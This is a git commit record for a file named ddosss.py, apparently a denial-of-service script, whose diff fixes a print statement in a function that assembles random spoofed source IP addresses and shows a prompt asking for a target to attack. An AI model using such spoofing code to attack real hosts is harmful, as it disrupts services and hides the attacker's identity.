697f350e0fbe0edf282f269f00bf6ff57d923f16
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-09-13 00:29:15 +0300

    Update ddosss.py

--- ddosss.py
+++ ddosss.py
@@ -74,7 +74,7 @@ def address_spoofer():
     addr[2] = str(random.randrange(0,255))
     addr[3] = str(random.randrange(2,254))
     assemebled = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]
-    print("assemebled”)
+    print(assemebled)
     return assemebled
 
 target = raw_input("Enter the target to attack: => ")
